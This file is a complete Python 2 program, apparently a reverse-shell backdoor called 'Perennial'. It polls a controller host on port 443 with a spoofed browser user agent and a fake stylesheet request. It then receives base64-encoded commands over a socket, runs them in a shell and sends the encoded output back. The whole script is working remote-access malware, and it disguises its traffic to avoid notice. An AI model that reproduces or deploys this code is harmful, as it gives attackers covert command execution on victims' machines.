#!/usr/bin/env python

import re
import sys
import time
import base64
import socket
import urllib2
import argparse
import logging as log
import subprocess as sp
from datetime import datetime

SIZE = 1024
UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='IP', type=str)
    parser.add_argument('delay', metavar='DELAY', type=int, help='(s)')
    parser.add_argument('-p', '--port')
    parser.add_argument('-v', '--verbose', action="store_true")
    return parser.parse_args()


def is_active(host, port):
    try:
        url = 'http://{}:{}/style.css'.format(host, port)
        req = urllib2.Request(url, headers={'User-Agent': UA})
        f = urllib2.urlopen(req)
        if f.code == 200:
            return True
    except urllib2.URLError:
        pass
    return False


def ctrl_shell_client(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        inp = s.recv(SIZE)
        inp = base64.b64decode(inp)
        if inp == 'fin':
            break
        elif re.search('^exec (".+"\ )+$', inp + ' '):
            ctrl_shell_exec(s, inp)
    s.close()


def ctrl_shell_exec(s, inp):
    stdout = ''
    cmds = parse_exec_cmds(inp)
    for cmd in cmds:
        stdout += '==========\n\n$ {}\n'.format(cmd)
        stdout += sp.Popen(cmd, stdout=sp.PIPE, shell=True).communicate()[0]
    stdout = base64.b64encode(stdout)
    s.send(stdout)


def parse_exec_cmds(inp):
    cmds = []
    inp = inp[5:]
    num_cmds = len(re.findall('"', inp)) / 2
    for i in range(num_cmds):
        first = inp.find('"')
        second = inp.find('"', first+1)
        cmd = inp[first+1:second]
        cmds.append(cmd)
        inp = inp[second+2:]
    return cmds


def main():
    args = get_args()

    if args.verbose:
        log.basicConfig(format='%(message)s', level=log.INFO)
    else:
        log.basicConfig(format='%(message)s')

    DELAY = args.delay
    HOST = args.host
    PORT = int(args.port) if args.port else 443

    log.info(('[+] Perennial started with delay of {} seconds to port {}.' +
              ' Ctrl-c to exit.').format(DELAY, PORT))

    while True:
        try:
            if is_active(HOST, PORT):
                log.info('[+] ({}) Server is active'.format(datetime.now()))
                ctrl_shell_client(HOST, PORT)
            else:
                log.info('[!] ({}) Server is inactive'.format(datetime.now()))
            time.sleep(DELAY)
        except KeyboardInterrupt:
            log.info('[-] Perennial terminated.')
            sys.exit(0)

if __name__ == '__main__':
    main()
